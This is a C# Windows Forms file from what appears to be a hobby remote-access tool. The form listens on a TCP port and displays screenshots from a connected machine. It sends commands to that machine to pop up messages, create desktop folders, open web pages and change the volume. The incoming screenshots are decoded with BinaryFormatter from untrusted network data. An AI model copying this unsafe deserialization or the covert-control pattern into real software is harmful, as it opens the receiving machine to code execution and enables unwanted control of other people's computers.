using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.CompilerServices;

using System.Runtime.InteropServices;

namespace Remote_Control_Access
{
    public partial class ScreenForm : Form
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private readonly int port;
        private TcpClient client;
        private TcpListener server;
        private NetworkStream mainStream;

        private readonly Thread Listening;
        private readonly Thread GetImage;
        private readonly Thread GetData;

        public ScreenForm(int Port)
        {
            port = Port;
            client = new TcpClient();
            Listening = new Thread(StartListening);
            GetImage = new Thread(ReceiveImage);
            GetData = new Thread(ReceiveData);

            InitializeComponent();
        }

        private void StartListening()
        {
            while (!client.Connected)
            {
                server.Start();
                client = server.AcceptTcpClient();
            }

            GetImage.Start();
            GetData.Start();
        }

        private void StopListening()
        {
            server.Stop();
            client = null;
            if (Listening.IsAlive) Listening.Abort();
            if (GetImage.IsAlive) GetImage.Abort();
        }

        private void ReceiveImage()
        {
            BinaryFormatter binFormat = new BinaryFormatter();
            while (client.Connected)
            {
                    mainStream = client.GetStream();
                    screenPicture.Image = (Image)binFormat.Deserialize(mainStream);
                    //byte[] buffer = new byte[client.ReceiveBufferSize];
                    //int bytesRead = mainStream.Read(buffer, 0, client.ReceiveBufferSize);
                    //string dataReceived = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            }
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            server = new TcpListener(IPAddress.Any, port);
            Listening.Start();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            StopListening();
        }
        private void ReceiveData()
        {
            /*while (true)
            {
                if (mainStream != null)
                {
                    //Reading all bytes that we receive so we can check data
                    byte[] buffer = new byte[client.ReceiveBufferSize];
                    int bytesRead = mainStream.Read(buffer, 0, client.ReceiveBufferSize);
                    string dataReceived = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                    //Splitting the commands so we can know what exactly we are searching for
                    List<string> commands = dataReceived?.Split(' ').ToList();
                    /*if (commands[0] == "ip")
                    {
                        ipTxt.Text = "IP: " + commands[1];
                    }
                    else if (commands[0] == "os")
                    {
                        ipTxt.Text = "OS: " + commands[1];
                    }
                    else if (commands[0] == "cpu")
                    {
                        ipTxt.Text = "CPU Cores: " + commands[1];
                    }
                    
                }
            }*/
        }

            private void ScreenForm_Load(object sender, EventArgs e)
        {
            tooltips.SetToolTip(sendMsgBtn, "It sends messagebox with the text you've typed!");
            tooltips.SetToolTip(createFolder, "It creates folder on the person's desktop with the name you've typed!");
        }

        private void sendMessage_Click(object sender, EventArgs e)
        {
            //NULL
        }

        private void createFolder_Click(object sender, EventArgs e)
        {
            if (mainStream != null)
            {
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes("desktop " + folderTxt.Text);
                mainStream.Write(bytesToSend, 0, bytesToSend.Length);
            }
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void openWeb_Click(object sender, EventArgs e)
        {
            if (mainStream != null)
            {
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes("web " + webTxt.Text);
                mainStream.Write(bytesToSend, 0, bytesToSend.Length);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //NULL (TVA BESHE INFO BUTONA DE CRASHVASHE)
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            /*
            */
        }
        private void sendMsgBtn_Click(object sender, EventArgs e)
        {
            if (mainStream != null)
            {
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes("msg " + messageTxt.Text);
                mainStream.Write(bytesToSend, 0, bytesToSend.Length);
            }
        }

        private void set_Click(object sender, EventArgs e)
        {
            if (mainStream != null)
            {
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes("setvolume " + soundBar.Value);
                mainStream.Write(bytesToSend, 0, bytesToSend.Length);
            }
        }

        private void rndSoundValueSetter_Click(object sender, EventArgs e)
        {
            Random _rnd = new Random();
            if (mainStream != null)
            {
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes("setvolume " + _rnd.Next(0, 100));
                mainStream.Write(bytesToSend, 0, bytesToSend.Length);
            }
        }

        private void muteSoundBtn_Click(object sender, EventArgs e)
        {
            if (mainStream != null)
            {
                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes("setvolume 0");
                mainStream.Write(bytesToSend, 0, bytesToSend.Length);
            }
        }
    }
}
